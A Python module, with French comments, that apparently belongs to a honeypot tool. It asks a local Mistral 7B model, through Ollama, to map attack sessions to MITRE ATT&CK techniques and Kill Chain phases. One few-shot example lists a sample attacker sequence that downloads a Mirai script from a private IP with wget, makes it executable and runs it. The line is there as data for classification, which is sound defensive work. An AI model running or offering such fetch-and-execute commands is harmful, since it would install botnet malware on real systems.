"""
ForenHive -- Mapping MITRE ATT&CK via Ollama / Mistral 7B
Analyse une session d'attaque et l'associe aux tactiques/techniques MITRE ATT&CK
ainsi qu'a une phase de la Cyber Kill Chain.

Fonctionne 100% hors ligne -- aucune cle API requise.
Le modele Mistral 7B tourne localement dans le conteneur forenhive-ollama.
"""

import json
import logging
import re
import requests

import config

log = logging.getLogger("ollama_mitre")

URL_CHAT = f"{config.OLLAMA_URL}/api/chat"

# ── Instructions donnees au modele ─────────────────────────────────────────────

SYSTEME = (
    "You are a cybersecurity analyst specializing in the MITRE ATT&CK framework. "
    "Given honeypot session data, output a JSON object with the ATT&CK mapping. "
    "Always include all four fields: tactics, techniques, kill_chain_phase, and summary. "
    "The summary field must be a non-empty string describing the attack in one sentence. "
    "Respond with valid JSON only -- no markdown, no explanation, no extra text."
)

# ── Exemples montres au modele (few-shot prompting) ────────────────────────────
# Mistral 7B comprend mieux avec des exemples concrets qu'avec des regles abstraites.

EXEMPLES = [
    # Exemple 1 : brute-force SSH + botnet Mirai
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "cowrie (SSH)",
            "destination_port": 22,
            "login_attempts":   342,
            "commands":         ["whoami", "uname -a", "wget http://192.168.1.10/bot.sh",
                                 "chmod +x bot.sh", "./bot.sh"],
            "yara_matches":     ["Mirai_Botnet"],
            "exfil_bytes":      0,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0006 - Credential Access", "TA0002 - Execution",
                        "TA0011 - Command and Control"],
            "techniques": [
                {"id": "T1110.001", "name": "Brute Force: Password Guessing",              "tactic": "TA0006"},
                {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell","tactic": "TA0002"},
                {"id": "T1105",     "name": "Ingress Tool Transfer",                       "tactic": "TA0011"},
                {"id": "T1496",     "name": "Resource Hijacking",                          "tactic": "TA0040"},
            ],
            "kill_chain_phase": "Installation",
            "summary": (
                "L'attaquant a fait 342 tentatives SSH, puis execute un payload "
                "Mirai pour rejoindre un botnet (C2)."
            )
        })
    },

    # Exemple 2 : reconnaissance legere
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "cowrie (SSH)",
            "destination_port": 22,
            "login_attempts":   4,
            "commands":         [],
            "yara_matches":     [],
            "exfil_bytes":      0,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0043 - Reconnaissance", "TA0001 - Initial Access"],
            "techniques": [
                {"id": "T1595.002", "name": "Active Scanning: Vulnerability Scanning", "tactic": "TA0043"},
                {"id": "T1110",     "name": "Brute Force",                              "tactic": "TA0001"},
            ],
            "kill_chain_phase": "Reconnaissance",
            "summary": "Scan automatise : 4 tentatives SSH, typique d'un scanner de credentials par defaut."
        })
    },

    # Exemple 3 : exploitation SMB (EternalBlue) + ransomware
    {
        "role": "user",
        "content": json.dumps({
            "honeypot":         "dionaea (SMB)",
            "destination_port": 445,
            "login_attempts":   1,
            "commands":         [],
            "yara_matches":     ["WannaCry_Ransomware", "CryptoMiner_XMRig"],
            "exfil_bytes":      84120,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": ["TA0001 - Initial Access", "TA0040 - Impact", "TA0010 - Exfiltration"],
            "techniques": [
                {"id": "T1190", "name": "Exploit Public-Facing Application",  "tactic": "TA0001"},
                {"id": "T1210", "name": "Exploitation of Remote Services",    "tactic": "TA0008"},
                {"id": "T1486", "name": "Data Encrypted for Impact",          "tactic": "TA0040"},
                {"id": "T1496", "name": "Resource Hijacking (XMRig miner)",   "tactic": "TA0040"},
            ],
            "kill_chain_phase": "Actions on Objectives",
            "summary": (
                "Exploitation SMB (EternalBlue/MS17-010) pour deployer WannaCry + "
                "un mineur XMRig. Exfiltration ~82 Ko detectee."
            )
        })
    },
]

# Phases de la Cyber Kill Chain dans l'ordre chronologique
PHASES_KILL_CHAIN = [
    "Reconnaissance", "Weaponization", "Delivery",
    "Exploitation", "Installation", "Command and Control", "Actions on Objectives",
]


class OllamaMitreMapper:
    """
    Envoie les donnees d'une session a Mistral 7B (via Ollama)
    pour obtenir le mapping MITRE ATT&CK correspondant.
    """

    def __init__(self):
        self._disponible = None   # teste au premier appel

    def _verifier_disponibilite(self) -> bool:
        """Verifie une seule fois si Ollama est accessible et le modele charge."""
        if self._disponible is not None:
            return self._disponible
        try:
            r = requests.get(f"{config.OLLAMA_URL}/api/tags", timeout=5)
            modeles = [m["name"].split(":")[0] for m in r.json().get("models", [])]
            self._disponible = config.OLLAMA_MODEL in modeles
            if not self._disponible:
                log.warning(
                    f"Modele '{config.OLLAMA_MODEL}' non charge dans Ollama "
                    f"(disponibles : {modeles or 'aucun'})"
                )
        except Exception as e:
            log.warning(f"Ollama inaccessible ({config.OLLAMA_URL}) : {e}")
            self._disponible = False
        return self._disponible

    def mapper_session(self, session: dict, commandes: list = None) -> dict | None:
        """
        Analyse une session d'attaque et retourne le mapping MITRE ATT&CK.

        Parametres :
          session   : dict avec honeypot_type, destination_port, login_attempts, etc.
          commandes : liste des commandes shell observees dans Cowrie

        Retourne un dict avec : tactics, techniques, kill_chain_phase, summary
        Ou None si Ollama est indisponible.
        """
        if not self._verifier_disponibilite():
            return None

        # Construire le payload a envoyer au modele
        donnees_session = {
            "honeypot":         _label_honeypot(session),
            "destination_port": session.get("destination_port", 0),
            "login_attempts":   session.get("login_attempts", 0),
            "commands":         (commandes or [])[:30],   # max 30 commandes
            "yara_matches":     session.get("yara_matches", []),
            "exfil_bytes":      session.get("exfil_bytes", 0),
        }

        # Messages : exemples + nouvelle session
        messages = EXEMPLES + [
            {"role": "user", "content": json.dumps(donnees_session)}
        ]

        # Appel a Ollama
        try:
            reponse = requests.post(
                URL_CHAT,
                json={
                    "model":    config.OLLAMA_MODEL,
                    "messages": [{"role": "system", "content": SYSTEME}] + messages,
                    "stream":   False,
                    "options":  {"temperature": 0.1, "num_predict": 512},
                },
                timeout=120,
            )
            reponse.raise_for_status()
        except requests.Timeout:
            log.warning("Timeout Ollama (120s) -- mapping MITRE ignore")
            return None
        except Exception as e:
            log.warning(f"Appel Ollama echoue : {e}")
            return None

        # Parser la reponse JSON du modele
        texte_brut = reponse.json().get("message", {}).get("content", "")
        resultat   = _extraire_json(texte_brut)
        if resultat is None:
            log.warning(f"Reponse Ollama non parseable : {texte_brut[:200]!r}")
            return None

        resultat = _valider_resultat(resultat)
        log.info(
            f"MITRE [{session.get('session_id', '')[:12]}...] "
            f"phase={resultat.get('kill_chain_phase')} "
            f"techniques={len(resultat.get('techniques', []))}"
        )
        return resultat

    # Alias
    def map_session(self, session: dict, commands: list = None) -> dict | None:
        return self.mapper_session(session, commands)


# ── Fonctions utilitaires ──────────────────────────────────────────────────────

def _label_honeypot(session: dict) -> str:
    """Retourne un label lisible pour le type de honeypot."""
    type_hp = session.get("honeypot_type", "unknown")
    port    = session.get("destination_port", 0)
    labels  = {
        "cowrie":  "cowrie (SSH/Telnet)",
        "dionaea": f"dionaea (port {port})",
        "galah":   "galah (HTTP)",
        "zeek":    "zeek (capteur reseau)",
    }
    return labels.get(type_hp, type_hp)


def _extraire_json(texte: str) -> dict | None:
    """
    Extrait un objet JSON depuis la reponse du LLM.
    Gere les cas ou le modele encadre le JSON avec ```json ... ```.
    """
    texte = texte.strip()
    # Retirer les balises markdown
    texte = re.sub(r"^```(?:json)?\s*", "", texte)
    texte = re.sub(r"\s*```$",          "", texte)

    # Tentative 1 : parser directement
    try:
        obj = json.loads(texte)
        if isinstance(obj, dict):
            return obj
    except json.JSONDecodeError:
        pass

    # Tentative 2 : chercher le premier bloc { ... }
    match = re.search(r"\{.*\}", texte, re.DOTALL)
    if match:
        try:
            return json.loads(match.group())
        except json.JSONDecodeError:
            pass

    return None


def _valider_resultat(resultat: dict) -> dict:
    """S'assure que les cles obligatoires sont presentes et de bon type."""
    if not isinstance(resultat.get("tactics"),    list):
        resultat["tactics"] = []
    if not isinstance(resultat.get("techniques"), list):
        resultat["techniques"] = []
    if resultat.get("kill_chain_phase") not in PHASES_KILL_CHAIN:
        resultat["kill_chain_phase"] = "Reconnaissance"
    if not isinstance(resultat.get("summary"), str):
        resultat["summary"] = ""
    return resultat
